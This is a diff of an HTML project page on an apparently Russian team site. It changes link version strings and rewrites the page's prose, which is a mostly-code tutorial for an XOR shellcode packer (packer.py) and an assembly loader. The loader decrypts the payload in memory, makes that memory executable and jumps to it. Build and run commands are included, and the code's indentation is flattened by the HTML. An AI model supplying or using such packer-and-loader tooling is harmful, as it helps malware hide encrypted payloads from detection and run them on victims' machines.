@@ -17,17 +17,17 @@
 <body class="page-project">
 <div class="bg-grid" aria-hidden="true"></div>
 <header class="top">
-  <a class="logo" href="/?v=8b732707" aria-label="interpanic — на главную"><span class="logo-dot"></span><span>inter<b>panic</b></span></a>
+  <a class="logo" href="/?v=78ed3053" aria-label="interpanic — на главную"><span class="logo-dot"></span><span>inter<b>panic</b></span></a>
   <nav>
-    <a href="/?v=8b732707#projects">Проекты</a>
-    <a href="/?v=8b732707#about">О команде</a>
-    <a href="/?v=8b732707#contacts">Контакты</a>
+    <a href="/?v=78ed3053#projects">Проекты</a>
+    <a href="/?v=78ed3053#about">О команде</a>
+    <a href="/?v=78ed3053#contacts">Контакты</a>
   </nav>
 </header>
 <main>
 
 <article class="project">
-  <a class="back" href="/?v=8b732707#projects"><span aria-hidden="true">←</span> Все проекты</a>
+  <a class="back" href="/?v=78ed3053#projects"><span aria-hidden="true">←</span> Все проекты</a>
   <div class="card-meta"><span class="status status-wip">В работе</span><span class="year">2026</span></div>
   <h1 class="p-title">привет бля.</h1>
   <p class="p-lead"></p>
@@ -39,47 +39,16 @@
   <button type="button" class="g-nav g-next" aria-label="Следующее фото">→</button>
   <div class="g-bar"><span class="g-count">01 / 04</span><div class="g-dots"><button type="button" aria-label="Фото 1"></button><button type="button" aria-label="Фото 2"></button><button type="button" aria-label="Фото 3"></button><button type="button" aria-label="Фото 4"></button></div></div>
 </div>
-  <div class="prose"><h2>1. Создание исходного кода полезной нагрузки</h2>
-<p>cat &lt;&lt; &#x27;EOF&#x27; &gt; payload.asm<br>bits 64<br>global _start</p>
-<p>section .text<br>_start:<br>mov rax, 60<br>mov rdi, 42<br>syscall<br>EOF</p>
-<h2>2. Создание скрипта-упаковщика (packer.py)</h2>
-<p>cat &lt;&lt; &#x27;EOF&#x27; &gt; packer.py<br>import sys</p>
+  <div class="prose"><p>cat &lt;&lt; &#x27;EOF&#x27; &gt; packer.py<br>import sys</p>
 <p>KEY = b&quot;K9#m$P2!vL8@zX5*qW7&amp;fB3%dN$z9&quot;</p>
 <p>def encrypt_payload(input_file, output_file):<br>with open(input_file, &quot;rb&quot;) as f:<br>plaintext = f.read()</p>
 <p>ciphertext = bytearray()<br>key_len = len(KEY)<br>for i, b in enumerate(plaintext):<br>ciphertext.append(b ^ KEY[i % key_len])</p>
 <p>with open(output_file, &quot;w&quot;) as f:<br>f.write(&quot;; Auto-generated encrypted payload\n&quot;)<br>f.write(&quot;section .data\n&quot;)<br>f.write(&quot;global encrypted_payload\n&quot;)<br>f.write(&quot;global payload_size\n\n&quot;)<br>f.write(&quot;encrypted_payload:\n    db &quot;)</p>
 <p>hex_bytes = [f&quot;0x{b:02x}&quot; for b in ciphertext]<br>for i in range(0, len(hex_bytes), 12):<br>f.write(&quot;, &quot;.join(hex_bytes[i:i+12]) + &quot;\n    db &quot;)</p>
 <p>f.seek(f.tell() - 6)<br>f.write(f&quot;\npayload_size dq {len(ciphertext)}\n&quot;)</p>
-<p>if __name__ == &quot;__main__&quot;:<br>encrypt_payload(sys.argv[1], sys.argv[2])<br>EOF</p>
-<h2>3. Создание исходного кода загрузчика</h2>
-<p>cat &lt;&lt; &#x27;EOF&#x27; &gt; loader.asm<br>bits 64<br>global _start</p>
-<p>extern encrypted_payload<br>extern payload_size</p>
-<p>section .data<br>key db &quot;K9#m$P2!vL8@zX5*qW7&amp;fB3%dN$z9&quot;, 0<br>key_len equ 28</p>
-<p>section .text<br>_start:<br>mov rsi, encrypted_payload<br>mov rcx, [payload_size]<br>mov rdi, rsi<br>xor r8, r8</p>
-<p>decrypt_loop:<br>cmp rcx, 0<br>je make_executable</p>
-<p>mov al, byte [rdi]<br>mov bl, byte [key + r8]<br>xor al, bl<br>mov byte [rdi], al</p>
-<p>inc rdi<br>inc r8<br>xor rdx, rdx<br>mov rax, r8<br>mov rbx, key_len<br>div rbx<br>mov r8, rdx</p>
-<p>dec rcx<br>jmp decrypt_loop</p>
-<p>make_executable:<br>mov rdi, encrypted_payload<br>mov rax, rdi<br>and rax, 0xFFFFFFFFFFFFF000</p>
-<p>mov rsi, [payload_size]<br>add rsi, 4095<br>and rsi, 0xFFFFFFFFFFFFF000</p>
-<p>mov rdx, 7<br>mov rax, 10<br>syscall</p>
-<p>test rax, rax<br>js exit_error</p>
-<p>jmp encrypted_payload</p>
-<p>exit_error:<br>mov rax, 60<br>mov rdi, 1<br>syscall<br>EOF</p>
-<h2>4. Установка зависимостей (для Debian / Ubuntu / Astra / WSL)</h2>
-<p>sudo apt update &amp;&amp; sudo apt install -y nasm binutils python3</p>
-<h2>5. Сборка полезной нагрузки</h2>
-<p>nasm -f elf64 payload.asm -o payload.o<br>ld payload.o -o payload</p>
-<h2>6. Шифрование и генерация payload.inc</h2>
-<p>python3 packer.py payload payload.inc</p>
-<h2>7. Сборка загрузчика</h2>
-<p>nasm -f elf64 loader.asm -o loader.o<br>ld loader.o -o memory_loader</p>
-<h2>8. Запуск и проверка кода возврата</h2>
-<p>./memory_loader<br>echo $?</p>
-<h2>Скачиваем пакет (для архитектуры x86_64)</h2>
-<p>wget http://ftp.ru.debian.org/debian/pool/main/n/nasm/nasm_2.16.03-1_amd64.deb</p>
-<h2>Устанавливаем его локально через apt</h2>
-<p>sudo apt install -y ./nasm_2.16.03-1_amd64.deb</p></div>
+<p>print(f&quot;[+] Payload encrypted. Size: {len(ciphertext)} bytes. Output: {output_file}&quot;)</p>
+<p>if __name__ == &quot;__main__&quot;:<br>if len(sys.argv) &lt; 3:<br>print(&quot;Usage: python3 packer.py &lt;input_binary&gt; &lt;output_inc&gt;&quot;)<br>sys.exit(1)<br>encrypt_payload(sys.argv[1], sys.argv[2])<br>EOF<br>______________________________<br>python3 packer.py payload payload.inc</p>
+<p>nasm -f elf64 loader.asm -o loader.o<br>ld loader.o -o memory_loader<br>./memory_loader<br>echo $?</p></div>
 </article>
 
 </main>
